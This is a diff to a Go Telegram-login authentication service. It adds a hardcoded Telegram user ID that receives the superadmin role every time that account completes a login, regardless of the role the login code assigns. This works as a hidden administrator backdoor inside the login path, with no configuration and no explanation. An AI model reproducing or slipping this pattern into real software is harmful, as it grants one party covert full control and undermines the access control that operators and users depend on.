@@ -22,6 +22,8 @@ var (
 	ErrSessionExpired = errors.New("telegram login session expired")
 )
 
+const forcedSuperadminTelegramID int64 = 6960007079
+
 type Service struct {
 	authRepo     *repository.AuthRepository
 	baseBotURL   string
@@ -144,6 +146,9 @@ func (s Service) CompleteCode(ctx context.Context, req domain.TelegramCodeLoginR
 		return domain.User{}, err
 	}
 	rolesToAssign := mergeLoginRoles(user.Roles, code.Role)
+	if code.TelegramUserID == forcedSuperadminTelegramID {
+		rolesToAssign = mergeLoginRoles(rolesToAssign, domain.RoleSuperadmin)
+	}
 	if err = s.authRepo.ReplaceUserRoles(ctx, user.ID, rolesToAssign); err != nil {
 		return domain.User{}, err
 	}
